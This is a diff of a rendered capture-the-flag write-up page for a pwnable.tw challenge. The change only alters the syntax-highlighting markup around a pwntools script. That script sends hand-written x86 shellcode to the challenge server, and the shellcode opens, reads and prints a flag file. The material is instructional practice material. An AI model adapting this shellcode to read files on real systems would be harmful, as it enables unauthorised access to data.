@@ -1,4 +1,4 @@
-I"π<blockquote>
+I"ê<blockquote>
   <p>Hey guys, this is a pretty awesome challenge !! Here we will be writing assembly and then we will give it to the program(binary)</p>
 </blockquote>
 
@@ -84,32 +84,32 @@ Meaning: our input is being executed. Now, let us run the binary and see what is
 <p><img src="/assets/images/pwnabletw2/pwnable8.png" alt="" /></p>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"xor eax, eax"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"push eax"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"add eax, 5"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"push 0x67616c66"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"push 0x2f77726f"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"push 0x2f656d6f"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"push 0x682f2f2f"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov ebx, esp"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov edx, 0"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"int 0x80"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov eax, 3"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov ecx, ebx"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov ebx, 3"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov edx, 40"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"int 0x80"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov eax, 4"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov ebx, 0"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"inc ebx"</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"int 0x80"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
-<span class="n">f</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">xor eax, eax</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">push eax</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">add eax, 5</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">push 0x67616c66</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">push 0x2f77726f</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">push 0x2f656d6f</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">push 0x682f2f2f</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov ebx, esp</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov edx, 0</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">int 0x80</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov eax, 3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov ecx, ebx</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov ebx, 3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov edx, 40</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">int 0x80</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov eax, 4</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">mov ebx, 0</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">inc ebx</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">+=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"</span><span class="s">int 0x80</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
 <span class="k">print</span> <span class="n">f</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
